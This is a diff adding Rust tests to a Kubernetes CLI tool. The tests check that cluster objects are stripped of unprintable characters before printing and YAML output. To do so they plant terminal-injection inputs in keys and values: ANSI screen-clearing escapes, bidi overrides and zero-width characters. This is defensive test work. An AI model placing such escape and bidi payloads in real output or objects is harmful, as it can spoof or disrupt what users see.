+///
+/// **A `\n` is asserted to survive**, or this test would pass over a [`clean`] that had gone back
+/// to being [`text`] (NOTES § D198).
+#[test]
+fn clean_reaches_a_string_in_every_position_a_document_can_hold_one() {
+    let mut tree: serde_yaml_ng::Value = serde_json::from_str(
+        &serde_json::json!({
+            "metadata": {
+                "annotations": {
+                    "no\u{202e}te": "deploy\u{1b}[2Jed by ci",
+                    "script": "line one\nline two\n",
+                },
+                "finalizers": ["kubernetes.io/pv\u{200b}-protection"],
+                "ownerReferences": [{"kind": "Rep\u{7f}licaSet", "controller": true}],
+            },
+        })
+        .to_string(),
+    )
+    .expect("a JSON body decodes into a document tree");
+    // **The one position a JSON body cannot build**, spliced in through the parser that can.
+    let tagged: serde_yaml_ng::Value =
+        serde_yaml_ng::from_str(r#"!Thing "sc\eale\u200bd to 3""#).expect("a YAML tag parses");
+    assert_eq!(
+        every_string(&tagged, &mut Vec::new()),
+        1,
+        "the YAML parser stopped producing a Tagged value, so the arm below is unexercised"
+    );
+    tree["metadata"]["tagged"] = tagged;
+
+    for body in [
+        r#"{"!Thing":"x"}"#,
+        r#"{"tag":{"!Thing":"x"}}"#,
+        r#"["!Thing"]"#,
+        r#""!Thing x""#,
+    ] {
+        let value: serde_yaml_ng::Value =
+            serde_json::from_str(body).expect("the adversarial body is JSON");
+        assert_eq!(
+            every_string(&value, &mut Vec::new()),
+            0,
+            "{body} decoded into a tagged value, so a document can carry a tag the real read \
+             was told it could not"
+        );
+    }
+
+    clean(&mut tree);
+    let printed = serde_yaml_ng::to_string(&tree).expect("the cleaned tree serialises");
+    println!("{printed}");
+
+    let survivors = still_unprintable(&tree);
+    assert!(
+        survivors.is_empty(),
+        "clean did not reach every position a string can sit in: {survivors:?}"
+    );
+    let mut found = Vec::new();
+    every_string(&tree, &mut found);
+    for kept in [
+        "deploy[2Jed by ci",
+        "note",
+        "kubernetes.io/pv-protection",
+        "ReplicaSet",
+        "scaled to 3",
+        "line one\nline two\n",
+    ] {
+        assert!(
+            found.iter().any(|held| held == kept),
+            "{kept:?} is not among {found:?}, so the strip took more than the character — or the \
+             walk never reached that position"
+        );
+    }
+}
+
+/// **Every committed capture, poisoned in every string, through [`clean`]** — the document
+/// guard's other half.
+///
+/// **The test above proves the positions this file could think of; this one proves the positions
+/// sixty-odd real objects actually hold** (NOTES § D29). It is the sweep
+/// [`no_captured_object_can_carry_an_unbounded_or_unprintable_field_through_ingest`] runs over the
+/// typed door, over the untyped one — the same corpus, the same poison, the other decode.
+///
+/// **The keys are poisoned here and not by [`poison_every_string`]**, which walks *into* an
+/// object's fields and never rewrites their names. That is right for the typed sweep — a snapshot
+/// type's field names are this repo's own — and it is a blind half here, where a key is
+/// `metadata.annotations`' and is written by whoever wrote the object. Measured: with the keys
+/// left alone, `clean`'s `Mapping` arm reduced to cleaning only its values passed this sweep over
+/// all sixty-odd captures (`dev-core`, 2026-08-31).
+///
+/// **The name is kept and the poison wrapped around it**, so two keys that differed still differ
+/// and the object keeps its shape — a sweep that renamed every key to one poison would collapse
+/// each mapping to a single entry and walk almost nothing.
+fn poison_every_key(value: &mut serde_json::Value, poison: &str) {
+    match value {
+        serde_json::Value::Array(items) => {
+            for item in items {
+                poison_every_key(item, poison);
+            }
+        }
+        serde_json::Value::Object(fields) => {
+            let mut poisoned = serde_json::Map::new();
+            for (name, mut field) in std::mem::take(fields) {
+                poison_every_key(&mut field, poison);
+                poisoned.insert(format!("{poison}{name}\u{200b}"), field);
+            }
+            *fields = poisoned;
+        }
+        _ => {}
+    }
+}
+
+/// **Fed a planted violation and watched fail**: `clean`'s `Mapping` arm reduced to cleaning only
+/// its values fails this on the first capture, naming the poisoned key (`dev-core`, 2026-08-31).
+#[test]
+fn no_captured_object_carries_an_unprintable_character_through_the_document_strip() {
+    let mut objects = 0;
+    let mut strings = 0;
+    for (fixture, kind, mut document) in every_captured_object() {
+        poison_every_string(&mut document, &poison(), true);
+        // **The key half, which the typed sweep's poison does not reach** ([`poison_every_key`]).
+        // A short poison, because every key in the object carries it and twenty thousand `P`s per
+        // key is a corpus this sweep spends a minute on rather than a second.
+        //
+        // **`KEY` is in it so the canary below can tell a key from a value**, which is the whole
+        // of finding 3: `poison()` also begins `\u{1b}[2J`, so *any string starts with `[2J`* was
+        // satisfied by every poisoned value and said nothing about the key half — measured, the
+        // `poison_every_key` call could be deleted with this sweep still green (`k8s-admin`,
+        // 2026-08-31).
+        poison_every_key(&mut document, "\u{1b}[2JKEY");
+        let mut tree: serde_yaml_ng::Value =
+            serde_json::from_str(&document.to_string()).expect("a poisoned capture is JSON");
+        clean(&mut tree);
+        let survivors = still_unprintable(&tree);
+        assert!(
+            survivors.is_empty(),
+            "{fixture}'s {kind} carried {} string(s) with no printed form through the document \
+             strip, the first being {:?}",
+            survivors.len(),
+            survivors.first()
+        );
+        let mut found = Vec::new();
+        every_string(&tree, &mut found);
+        // **A *key* survived the strip, not merely a string.** `poison()` shares the `[2J` head,
+        // so only the `KEY` marker separates the half this assertion is here for from the half
+        // the value poison already covers.
+        assert!(
+            found.iter().any(|held| held.starts_with("[2JKEY")),
+            "{fixture}'s {kind} came out of the strip with no poisoned mapping key left, so the \
+             key half of this sweep planted nothing and proves nothing"
+        );
+        assert!(
+            found.iter().any(|held| held.starts_with("[2JP")),
+            "{fixture}'s {kind} came out of the strip with no poisoned value left, so the value \
+             half of this sweep planted nothing and proves nothing"
+        );
+        objects += 1;
+        strings += found.len();
+    }
+    println!("{objects} captured objects swept, {strings} strings walked");
+    assert!(
+        objects > 50 && strings > 500,
+        "only {objects} objects and {strings} strings were swept, so this sweep is reading the \
+         wrong place"
+    );
+}
+
+// --- SANITISING FOR THE SCREEN AND EMITTING FOR A CONSUMER ---
+//
+// **The box's question is a measurement and not an argument** (todo.md § Phase 6,
+// PRIOR-ART § D1): a string that came off the API is stripped at ingest and then passed through
+// `main.rs`'s `sanitize` at the `format!` that prints it, and those two functions have two
+// different disposals — [`text`] *replaces* an unprintable whitespace character with a space,
+// `sanitize` removes and never substitutes (NOTES § D122, § D146). Whether that is a second
+// transformation or a no-op depends on whether anything survives the first to reach the second,
+// which is a thing to run rather than to reason about.
+
+/// **`crate::sanitize` cannot act on anything the ingest strip produced** — the box's ruling 3,
+/// measured.
+///
+/// **The answer is that it is a no-op, and the reason is structural**: [`text`] removes or
+/// replaces every character [`unprintable`] answers for, and a space is not one — so what it
+/// returns holds nothing for a second pass to find. `main.rs` calls `sanitize` 62 times, on 61
+/// lines (`grep -o 'sanitize(' src/main.rs | wc -l` is 63, one of which is the definition and one
+/// line of which carries two), and not one of them is a second transformation on a value the
+/// ingest guard had already seen.
+///
+/// **It stays where it is rather than being deleted, because two live inputs never meet this
+/// file**: `k8rs some-pod.json` builds its snapshot straight off `rules.rs`'s `From` impls, and
+/// **argv is not an API object on any path** — a `--namespace`, a flag or a file path the reader
+/// typed reaches the terminal with `sanitize` as the only thing in the way, on a cluster run as
+/// much as a fixture one (`k8s-admin`, 2026-08-31; `main.rs` says so above its own definition,
+/// NOTES § D122). **What this test proves is the narrower claim its name makes**, and the doc
+/// beside `sanitize` said the wider one until that measurement.
+///
+/// **The asymmetric half is here beside it, because it is the one that is not a no-op.** [`clean`]
+/// keeps `\n`, `\t` and `\r` (NOTES § D198) and `sanitize` removes all three, so a `sanitize`
+/// anywhere on the document path *would* be the second transformation this box refuses — which is
+/// why `--yaml` writes `Document::yaml` straight to stdout and nothing in between touches it.
+///
+/// **Fed the whole corpus and not a sample** (NOTES § D29): every string of every committed
+/// capture, poisoned, plus one input per class the strip knows — the two whitespace controls it
+/// substitutes for, the five it removes, and one from each invisible block D154 added.
+#[test]
+fn sanitize_cannot_act_on_anything_the_ingest_strip_left() {
+    let mut inputs: Vec<String> = [
+        "line one\nline two",
+        "a\tb",
+        "over\rwritten",
+        "escape \u{1b}[2J here",
+        "bell \u{7}",
+        "delete \u{7f}",
+        "c1 \u{9b} control",
+        "next \u{85} line",
+        "soft \u{ad} hyphen",
+        "zero \u{200b} width",
+        "bidi \u{202e} override",
+        "joiner \u{2060} word",
+        "byte \u{feff} order",
+        "nothing unprintable at all",
+        "",
+    ]
+    .iter()
+    .map(|held| (*held).to_string())
+    .collect();
+    for (_, _, mut document) in every_captured_object() {
+        poison_every_string(&mut document, &poison(), true);
+        let tree: serde_yaml_ng::Value =
+            serde_json::from_str(&document.to_string()).expect("a poisoned capture is JSON");
+        every_string(&tree, &mut inputs);
+    }
+    assert!(
+        inputs.len() > 500,
+        "only {} strings were collected, so this measurement is reading nearly nothing",
+        inputs.len()
+    );
+
+    let mut acted_on = Vec::new();
+    for raw in &inputs {
+        let mut stripped = raw.clone();
+        text(&mut stripped, FREE_TEXT);
+        if crate::sanitize(&stripped) != stripped {
+            acted_on.push(stripped);
+        }
+    }
+    println!(
+        "{} strings through `text` and then `sanitize`; {} of them changed",
+        inputs.len(),
+        acted_on.len()
+    );
+    assert!(
+        acted_on.is_empty(),
+        "`sanitize` is a second transformation on text the ingest guard already stripped, which \
+         is the defect this box exists to find: {acted_on:?}"
+    );
+
+    // **The other direction, or the assertion above is satisfied by a `sanitize` that returns its
+    // argument unread.** A document keeps what a cell does not, and `sanitize` takes all three
+    // back (NOTES § D198).
+    for kept in ["line one\nline two\n", "a\tb", "over\rwritten"] {
+        let mut document = serde_yaml_ng::Value::String(kept.to_string());
+        clean(&mut document);
+        let held = document.as_str().expect("clean left a string a string");
+        assert_eq!(held, kept, "clean did not keep what a document keeps");
+        assert_ne!(
+            crate::sanitize(held),
+            held,
+            "`sanitize` left {kept:?} alone, so this test cannot tell a no-op apart from a \
+             function that never runs"
+        );
+    }
+}
+
+/// **What `--yaml` prints re-reads as the tree the strip left, and carries nothing the printer
+/// added** — the emit half of this box, over the one path NOTES § D198 already settled.
+///
+/// **The assertion is an equality against a re-parse and not a search for a substring.** A
+/// substring says one value survived; it says nothing about a printer that also folded a long
+/// line, padded a column, or stripped a second time somewhere else in the same document. Parsing
+/// the emitted YAML back and comparing it to a tree written out by hand is the whole claim in one
+/// line — every string, in every position, is what the strip left and nothing else — and the
+/// expected tree is spelled literally rather than computed, so it says what the requirement is
+/// and not what the code returned (CLAUDE.md § Tests must not lie).
+///
+/// **The long value is what makes this a wrap guard.** Nothing on any emit path wraps today —
+/// `main.rs`'s `column` pads and never cuts, and `serde_yaml_ng`'s emitter does not fold: measured,
+/// a 155-character scalar comes back on one line (`dev-core`, 2026-08-31). So the subject of this
+/// half of the box does not exist yet, and what is written here is the assertion that fails the
+/// day it does: a value carrying a space at column 80 and another at 120 comes back through a
+/// re-parse only while nothing has broken it.
+#[tokio::test]
+async fn what_yaml_prints_re_reads_as_the_tree_the_strip_left_and_nothing_else() {
+    // 158 characters, with a space either side of column 80 and of column 120, and brackets in it
+    // — the shape `PRIOR-ART § D1` is about, where cluster data is read as markup.
+    let long = "allocating 240MB of cache [accounts] for the accounts table, which is one \
+                sentence long enough to cross both an 80 column and a 120 column boundary twice \
+                over";
+    assert!(long.len() > 120, "the value does not cross either boundary");
+    let (client, _) = stub_list(
+        "200 OK",
+        serde_json::json!({
+            "apiVersion": "v1", "kind": "ConfigMap",
+            "metadata": {
+                "name": "web",
+                "annotations": { "no\u{202e}te": "deploy\u{1b}[2Jed by ci" },
+            },
+            "data": {
+                "long": format!("\u{1b}[2J{long}\u{200b}"),
+                "script": "line one\nline two\n",
+            },
+        })
+        .to_string(),
+    )
+    .await;
+    let printed = document(
+        &client,
+        &Fetch {
+            path: "/api/v1/namespaces/payments/configmaps".to_string(),
+            accept: PLAIN_ACCEPT,
+        },
+        "web",
+        "ConfigMap",
+    )
+    .await
+    .expect("the server answered")
+    .yaml()
+    .expect("a ConfigMap is a document that serialises");
+    println!("{printed}");
+
+    let expected: serde_yaml_ng::Value = serde_json::from_str(
+        &serde_json::json!({
+            "apiVersion": "v1", "kind": "ConfigMap",
+            "metadata": { "name": "web", "annotations": { "note": "deploy[2Jed by ci" } },
+            // The `ESC` and the zero-width space the body carried are gone; the brackets, the
+            // spaces at both boundaries and the `[2J` the escape left behind are not.
+            "data": { "long": format!("[2J{long}"), "script": "line one\nline two\n" },
+        })
+        .to_string(),
+    )
+    .expect("the expected tree is JSON");
+    let read_back: serde_yaml_ng::Value =
+        serde_yaml_ng::from_str(&printed).expect("what k8rs printed is YAML");
+    assert_eq!(
+        read_back, expected,
+        "what came out of --yaml is not the tree the ingest strip leaves: {printed:?}"
+    );
+
+    // **And the bytes, not only what they parse to.** A folded scalar re-reads equal and is not
+    // the object's own line, so the equality above cannot see a wrap on its own.
+    assert!(
+        printed.contains(long),
+        "the long value was broken across lines on the way out, so a reader diffing this file \
+         sees a change the cluster did not make: {printed:?}"
+    );
+    assert!(
+        printed.lines().any(|line| line.chars().count() > 120),
+        "no line is over 120 characters, so this guard was never fed the boundary it is for"
     );
 }
